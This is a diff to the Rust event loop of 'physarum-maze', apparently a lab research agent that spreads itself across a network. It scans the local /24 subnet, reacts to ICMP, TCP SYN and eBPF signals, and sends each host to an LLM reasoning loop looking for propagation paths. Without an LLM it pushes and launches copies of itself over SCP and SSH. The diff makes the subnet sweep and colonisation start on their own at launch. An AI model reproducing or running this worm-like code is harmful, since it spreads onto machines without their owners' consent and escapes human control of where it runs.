@@ -1,20 +1,22 @@
-/// Main agent event loop — PF-2 edition.
+/// Main agent event loop — Issue #126 adaptive sensing edition.
 ///
-/// Stimulus sources (all feed the same candidate pipeline):
-///   1. Raw ICMP socket: incoming echo requests (higher layers ping lower layers)
-///   2. Raw TCP SYN socket: incoming SYN to port 22 (X→A.1 stimulus in PF-2)
-///   3. Periodic /24 TCP-connect discovery: finds new hosts in the local subnet (A→A.1)
+/// Two organic stimulus paths — no external harness required:
 ///
-/// Per-candidate decision chain:
-///   1. Skip if already in lineage path (cycle guard)
-///   2. Skip if known dead end
-///   3. Skip if already marked colonized this session
-///   4. Skip if already attempted this session
-///   5. TCP-22 probe: confirm SSH is listening
-///   6. Colonization check: if target already runs physarum-maze → secondary conduit
-///   7. Targeted nmap -sV scan (informational, non-blocking)
-///   8. SCP push + SSH launch propagated instance
-///   9. Update lineage + save /tmp/physarum-lineage.json
+/// Path A — Startup sensing (every 180 s, first tick fires immediately):
+///   discovery_ticker fires
+///     → startup_sweep(/24 of local interface, STARTUP_SWEEP_PORTS)
+///     → for each discovered host → handle_candidate(ip, "startup-sensing")
+///     → llm_loop::run (SensingProfile::StartupLocalDiscovery)
+///     → DiscoveryQuery → LLM → PolicyGate → LlmAttemptEvidence → lineage
+///
+/// Path B — Runtime stimulus (ICMP / TCP-SYN / eBPF):
+///   raw socket / eBPF observer detects inbound packet
+///     → handle_candidate(ip, "icmp" | "tcp-syn" | "ebpf")
+///     → llm_loop::run (RuntimeIcmpFast or RuntimeTcpEbpfFast)
+///     → DiscoveryQuery → LLM → PolicyGate → LlmAttemptEvidence → lineage
+///
+/// When LLM is not configured (no --llm-endpoint), the agent falls back to
+/// the SSH-propagation path (port-22 probe → SCP/SSH colonisation).
 use crate::{
     lineage::Lineage,
     llm_loop::{self, LlmOutcome},
@@ -43,7 +45,6 @@ impl LlmConfig {
     fn from_cli(cli: &Cli) -> Option<Self> {
         let endpoint = cli.llm_endpoint.as_deref()?;
 
-        // Parse allowed CIDR for PolicyGate
         let allowed_cidrs = parse_cidr(cli.llm_allowed_cidr.as_deref()).unwrap_or_default();
 
         let mut gate = PolicyGate::lab_default();
@@ -58,7 +59,6 @@ impl LlmConfig {
         let client: Arc<dyn physarum_llm::LlmClient> = if endpoint == "mock" {
             Arc::new(MockLlmClient::no_path("mock mode — no real LLM"))
         } else if endpoint == "mock-http" {
-            // Docker Lab: real HTTP GET executed against target — proves full pipeline
             Arc::new(MockLlmClient::http_probe_with_plan("/", 0.9))
         } else {
             let api_key = cli.llm_api_key.clone().unwrap_or_default();
@@ -120,18 +120,17 @@ pub async fn run(cli: Cli) -> Result<()> {
         tokio::time::interval(Duration::from_secs(cli.discovery_interval_secs));
     let mut attempted: HashSet<Ipv4Addr> = HashSet::new();
 
-    // dormant_at is reset on every successful stimulus; when it fires the
-    // organism goes dormant.  Using sleep_until lets us reset cheaply each loop.
     let stimulus_timeout = Duration::from_secs(cli.stimulus_timeout_secs);
     let mut dormant_at = tokio::time::Instant::now() + stimulus_timeout;
 
     tracing::info!(
-        mode    = ?cli.mode,
-        hops    = lineage.hops,
-        origin  = %lineage.origin,
-        path    = ?lineage.path,
-        local   = ?local_ip.map(|ip| ip.to_string()),
-        "physarum-maze agent ready — awaiting stimulus"
+        mode                 = ?cli.mode,
+        hops                 = lineage.hops,
+        origin               = %lineage.origin,
+        path                 = ?lineage.path,
+        local                = ?local_ip.map(|ip| ip.to_string()),
+        discovery_interval_s = cli.discovery_interval_secs,
+        "physarum-maze agent ready — startup sweep on first tick"
     );
 
     loop {
@@ -152,7 +151,7 @@ pub async fn run(cli: Cli) -> Result<()> {
                 }
             }
 
-            // ── TCP SYN to port 22 stimulus (PF-2: X → A.1) ──────────────
+            // ── TCP SYN stimulus ──────────────────────────────────────────
             maybe_ip = tcp_rx.recv() => {
                 match maybe_ip {
                     Some(ip) => {
@@ -168,19 +167,28 @@ pub async fn run(cli: Cli) -> Result<()> {
                 }
             }
 
-            // ── Periodic /24 TCP-connect discovery ───────────────────────
+            // ── Startup/periodic /24 sweep (Path A) ───────────────────────
             _ = discovery_ticker.tick() => {
                 if let Some(my_ip) = local_ip {
-                    let candidates = crate::discovery::scan_local_subnet(my_ip).await;
+                    let candidates = crate::discovery::startup_sweep(my_ip).await;
+                    tracing::info!(
+                        found = candidates.len(),
+                        local = %my_ip,
+                        "startup sweep complete"
+                    );
+                    if !candidates.is_empty() {
+                        dormant_at = tokio::time::Instant::now() + stimulus_timeout;
+                    }
                     for ip in candidates {
                         handle_candidate(
-                            ip, "discovery", &mut lineage, &binary_path, &mut attempted, &llm,
+                            ip, "startup-sensing", &mut lineage, &binary_path,
+                            &mut attempted, &llm,
                         ).await?;
                     }
                 }
             }
 
-            // ── eBPF inbound connection stimulus (Linux + bytecode path only) ──
+            // ── eBPF inbound connection stimulus ──────────────────────────
             maybe_ebpf = async {
                 if let Some(rx) = ebpf_rx.as_mut() {
                     rx.recv().await
@@ -224,6 +232,17 @@ pub async fn run(cli: Cli) -> Result<()> {
 }
 
 /// Process one candidate IP regardless of which stimulus source produced it.
+///
+/// Guard order:
+///   1. Cycle guard — skip if IP is already in the lineage path.
+///   2. Dead-end guard — skip passive probes against known dead ends;
+///      active stimuli (ICMP/TCP/eBPF) clear the mark and re-validate.
+///   3. Colonised guard — skip already-colonised hosts.
+///   4. Session dedup — skip IPs already attempted this run.
+///
+/// Decision order when guards pass:
+///   A. LLM configured → llm_loop::run (adaptive profile from stimulus).
+///   B. LLM absent → port-22 probe → SSH/SCP propagation fallback.
 async fn handle_candidate(
     src_ip: Ipv4Addr,
     stimulus: &str,
@@ -234,21 +253,24 @@ async fn handle_candidate(
 ) -> Result<()> {
     let ip_str = src_ip.to_string();
 
+    // ── Guards ────────────────────────────────────────────────────────────
     if lineage.is_visited(&ip_str) {
         tracing::debug!(%src_ip, stimulus, "already in lineage path — loop guard, skip");
         return Ok(());
     }
     if lineage.is_dead_end(&ip_str) {
-        if stimulus == "discovery" {
-            tracing::debug!(%src_ip, stimulus, "known dead end — skip passive probe");
-            return Ok(());
+        match stimulus {
+            "startup-sensing" | "discovery" => {
+                tracing::debug!(%src_ip, stimulus, "known dead end — skip passive probe");
+                return Ok(());
+            }
+            _ => {
+                // Active stimulus: host is signalling — environment may have changed.
+                tracing::info!(%src_ip, stimulus, "dead-ended host sent active stimulus — revalidating");
+                lineage.unmark_dead_end(&ip_str);
+                attempted.remove(&src_ip);
+            }
         }
-        // Active stimulus (icmp/tcp-syn/ebpf): the host is signalling its presence,
-        // meaning the environment changed since the dead end was recorded.
-        // Remove the mark and fall through to re-validate.
-        tracing::info!(%src_ip, stimulus, "dead-ended host sent active stimulus — revalidating");
-        lineage.unmark_dead_end(&ip_str);
-        attempted.remove(&src_ip);
     }
     if lineage.is_colonized(&ip_str) {
         tracing::debug!(%src_ip, stimulus, "already colonized — skip");
@@ -259,43 +281,41 @@ async fn handle_candidate(
         return Ok(());
     }
 
-    tracing::info!(%src_ip, stimulus, "stimulus received — confirming SSH on port 22");
+    tracing::info!(%src_ip, stimulus, "candidate accepted — starting evidence pipeline");
 
-    if !port_22_open(src_ip).await {
-        // Port 22 closed — Causal Continuity Paradox territory.
-        // If LLM reasoning is enabled, ask it for an alternative propagation path
-        // before giving up. Without LLM, fall through to dead-end scoring.
-        if let Some(cfg) = llm {
-            tracing::info!(%src_ip, stimulus, "port 22 closed — handing off to LLM reasoning loop");
-            match llm_loop::run(src_ip, stimulus, lineage, cfg.client.as_ref(), &cfg.gate).await? {
-                LlmOutcome::Propagated => {
-                    tracing::info!(%src_ip, "LLM propagation succeeded");
-                    lineage.save()?;
-                    return Ok(());
-                }
-                LlmOutcome::DeadEnd => {
-                    tracing::warn!(%src_ip, "LLM exhausted — marking dead end");
-                    lineage.mark_dead_end(&ip_str);
-                    lineage.save()?;
-                    return Ok(());
-                }
+    // ── Path A: LLM reasoning (all stimuli when LLM is configured) ────────
+    if let Some(cfg) = llm {
+        match llm_loop::run(src_ip, stimulus, lineage, cfg.client.as_ref(), &cfg.gate).await? {
+            LlmOutcome::Propagated => {
+                tracing::info!(%src_ip, "LLM propagation succeeded");
+                lineage.save()?;
+                return Ok(());
+            }
+            LlmOutcome::DeadEnd => {
+                tracing::warn!(%src_ip, "LLM exhausted — marking dead end");
+                lineage.mark_dead_end(&ip_str);
+                lineage.save()?;
+                return Ok(());
             }
         }
+    }
+
+    // ── Path B: SSH fallback (no LLM) ─────────────────────────────────────
+    tracing::info!(%src_ip, stimulus, "confirming SSH on port 22 (no LLM configured)");
+    if !port_22_open(src_ip).await {
         tracing::warn!(%src_ip, "port 22 not open — dead end");
         lineage.mark_dead_end(&ip_str);
         lineage.save()?;
         return Ok(());
     }
 
-    // Targeted scan (informational — does not block propagation decision).
     crate::discovery::scan_targeted(src_ip);
 
     let next_lineage = lineage.extend(&ip_str);
     let next_b64 = next_lineage.to_b64()?;
 
-    tracing::info!(%src_ip, hops = next_lineage.hops, "propagating");
+    tracing::info!(%src_ip, hops = next_lineage.hops, "propagating via SSH");
 
-    // propagate() performs the colonization check (step 0) before SCP.
     match propagation::propagate(src_ip, binary_path, &next_b64).await? {
         Outcome::Success => {
             tracing::info!(%src_ip, hops = next_lineage.hops, "propagation success");
@@ -314,7 +334,7 @@ async fn handle_candidate(
             lineage.save()?;
         }
         Outcome::ScpFailed => {
-            tracing::warn!(%src_ip, "SCP failed — sshd AllowUsers blocked (dead end)");
+            tracing::warn!(%src_ip, "SCP failed — dead end");
             lineage.mark_dead_end(&ip_str);
             lineage.save()?;
         }
@@ -352,10 +372,10 @@ fn init_lineage(cli: &Cli) -> Result<Lineage> {
     }
 }
 
-/// Resolve the local IPv4 address used for /24 discovery.
+/// Resolve the local IPv4 address used for /24 startup sweep.
 ///
-/// In seed mode: read from the NIC.
-/// In propagated mode: the last IP in the lineage path is the current host.
+/// Seed mode: read from the NIC.
+/// Propagated mode: the last IP in the lineage path is the current host.
 fn resolve_local_ip(cli: &Cli, lineage: &Lineage) -> Option<Ipv4Addr> {
     match &cli.mode {
         Mode::Seed => local_ip(&cli.interface).ok(),
@@ -364,6 +384,7 @@ fn resolve_local_ip(cli: &Cli, lineage: &Lineage) -> Option<Ipv4Addr> {
 }
 
 /// TCP connect probe — confirms port 22 is open and accepting connections.
+/// Used only in the SSH fallback path (no LLM configured).
 async fn port_22_open(ip: Ipv4Addr) -> bool {
     match timeout(Duration::from_secs(5), TcpStream::connect((ip, 22u16))).await {
         Ok(Ok(_)) => {
@@ -382,11 +403,6 @@ async fn port_22_open(ip: Ipv4Addr) -> bool {
 }
 
 /// Initialize the optional eBPF stimulus receiver.
-///
-/// On Linux, if `--bpf-bytecode` was given, loads the eBPF program and returns
-/// a Receiver that emits source IPs of inbound TCP connections from 10.60/16.
-/// On all other platforms, or when no bytecode path is provided, returns None
-/// so the corresponding select! arm uses `std::future::pending` and never fires.
 fn init_ebpf(cli: &Cli) -> Option<mpsc::Receiver<Ipv4Addr>> {
     #[cfg(target_os = "linux")]
     if let Some(ref path) = cli.bpf_bytecode {
@@ -400,7 +416,7 @@ fn init_ebpf(cli: &Cli) -> Option<mpsc::Receiver<Ipv4Addr>> {
             }
         }
     }
-    let _ = cli; // suppress unused-variable on non-Linux
+    let _ = cli;
     None
 }
 
